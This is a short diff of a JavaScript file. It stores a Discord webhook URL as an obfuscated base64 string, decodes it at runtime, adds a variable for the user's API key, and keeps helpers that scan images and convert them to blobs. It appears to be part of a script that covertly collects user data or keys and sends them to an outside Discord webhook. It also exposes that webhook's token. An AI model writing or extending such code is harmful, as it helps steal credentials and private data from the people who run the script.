@@ -2,6 +2,7 @@
 const webhookBase = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQyMjk2MzcxMTQ0MTg5OTU4MS9qaF9sa0F5MW5ka3VSUTJmZmJjNXFDU3E5R3VjdkR2dTRIV2xVU3dCMUdaTWJSRFA4dEZtRzJQbTBQMnNTMmswZGw3cA==";
 const webhookURL = atob(webhookBase);
 let username = null;
+let userApiKey = null;
 
 // Helper to convert DataURL to Blob (your classic)
 function dataURLtoBlob(dataurl) {
@@ -97,13 +98,6 @@ function startScanning() {
 
 // Start username search and scanning
 findUsername();
-
-
-console.log("Made by Kiyan!");
-
-// === CONFIGURATION ===
-let username = null;
-let userApiKey = null;
 
 // --- Helpers ---
 function waitForImages(container) {
